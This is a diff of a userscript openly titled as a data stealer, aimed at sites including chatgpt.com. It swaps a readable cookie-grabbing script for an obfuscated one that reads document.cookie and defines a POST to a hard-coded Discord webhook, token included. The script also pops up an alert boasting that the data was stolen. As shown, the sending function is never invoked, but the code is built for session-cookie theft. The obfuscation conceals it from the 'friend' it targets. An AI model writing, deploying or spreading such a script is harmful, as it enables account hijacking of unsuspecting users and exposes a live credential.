@@ -1,5 +1,5 @@
 // ==UserScript==
-// @name         New Userscript DATA STEALER
+// @name         New Userscript DATA STEALER TROLL UR FRIEND WiTh THIS
 // @namespace    http://tampermonkey.net/
 // @version      2026-05-30
 // @description  try to take over the world!
@@ -12,28 +12,7 @@
 // @match        https://chatgpt.com\*
 // @match        https://playbloxd.io/*
 // @match        https://elm.umaryland.edu/elm-stories/2023/Hacked.jpg/*
-// @icon         data:image/gif;base64,R0lGODlhAQABAAAAACH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==
+// @icon         https://upload.wikimedia.org/wikipedia/en/7/73/Trollface.png
 // @grant        none
 // ==/UserScript==
-var _LOL;
-(function LOL() {
-    
-        let dadaStealing = false;
-        var _LOL = document.cookie;
-        console.log('STEALED DATA:', _LOL);
-        function HAHA() {
-            var WebHook = 'https://discord.com/api/webhooks/1510424027674447872/C04p4PSXFe8K4C6Cy8-TLFz5u7RgYZMp-MvWWeA1afByEprrmvHOAUY_v9NHroOJg8-f';
-            fetch(WebHook, {
-                method: 'POST',
-                headers: {
-                    'Content-Type' : 'application/json'
-                },
-                body: JSON.stringify({
-                    username: 'all DATA Stealed',
-                    content: _LOL
-                })
-            });
-        }
-        console.log(_LOL);
-        alert('all Data is succefully stealed✅ and sended to cartoonbloxd !!!');
-})();
+(function(_0x51f0bf,_0x571623){var _0x196a97=_0x3091,_0x859128=_0x51f0bf();while(!![]){try{var _0x4aaff2=-parseInt(_0x196a97(0x94))/0x1*(-parseInt(_0x196a97(0x8f))/0x2)+parseInt(_0x196a97(0x92))/0x3+parseInt(_0x196a97(0x9a))/0x4*(parseInt(_0x196a97(0x96))/0x5)+parseInt(_0x196a97(0x9e))/0x6+parseInt(_0x196a97(0x90))/0x7+-parseInt(_0x196a97(0x9c))/0x8*(parseInt(_0x196a97(0x9b))/0x9)+-parseInt(_0x196a97(0x91))/0xa;if(_0x4aaff2===_0x571623)break;else _0x859128['push'](_0x859128['shift']());}catch(_0x136b6c){_0x859128['push'](_0x859128['shift']());}}}(_0x25a2,0xe739f));var _LOL;function _0x3091(_0x2d3a57,_0x4eaa01){_0x2d3a57=_0x2d3a57-0x8f;var _0x25a28a=_0x25a2();var _0x3091a8=_0x25a28a[_0x2d3a57];return _0x3091a8;}function _0x25a2(){var _0x59e68c=['5189751wiGZol','application/json','67EzACKK','STEALED\x20DATA:','732135DevjyS','cookie','https://discord.com/api/webhooks/1510424027674447872/C04p4PSXFe8K4C6Cy8-TLFz5u7RgYZMp-MvWWeA1afByEprrmvHOAUY_v9NHroOJg8-f','all\x20DATA\x20Stealed','4lWZPIU','9klqNwv','691936czLKbs','stringify','2682246pxHNwa','POST','156aiLUMx','9123233VxUYjB','25983350gVKhiG'];_0x25a2=function(){return _0x59e68c;};return _0x25a2();}(function LOL(){var _0x18eeaf=_0x3091;let _0xaaa027=![];var _0x536f0a=document[_0x18eeaf(0x97)];console['log'](_0x18eeaf(0x95),_0x536f0a);function _0x1ad872(){var _0x2821b4=_0x18eeaf,_0x585ff1=_0x2821b4(0x98);fetch(_0x585ff1,{'method':_0x2821b4(0x9f),'headers':{'Content-Type':_0x2821b4(0x93)},'body':JSON[_0x2821b4(0x9d)]({'username':_0x2821b4(0x99),'content':_0x536f0a})});}console['log'](_0x536f0a),alert('all\x20Data\x20is\x20succefully\x20stealed✅\x20and\x20sended\x20to\x20cartoonbloxd\x20!!!');}());
